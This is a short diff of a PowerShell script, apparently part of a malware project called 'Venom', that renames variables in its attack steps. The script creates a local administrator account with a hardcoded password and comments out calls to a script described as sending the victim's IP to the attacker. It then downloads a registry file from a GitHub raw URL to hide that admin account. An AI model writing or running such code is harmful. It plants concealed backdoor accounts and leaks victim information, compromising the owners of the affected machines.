@@ -34,18 +34,18 @@ $initial_dir = Get-Location
 
 
 # create admin user
-$uname = "Venom"
-$pword = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
-create_account -uname $uname -pword $pword
+$NewLocalAdmin = "Venom"
+$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # send ip to attacker
-./smtp.ps1
+#./smtp.ps1
 
 #goto temp, make working dir
 mkdir $path
 cd $path
 # mv $initial_dir/smtp.txt ./smtp.ps1
-./smtp.ps1
+#./smtp.ps1
 
 # registry to hide  local admin
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"
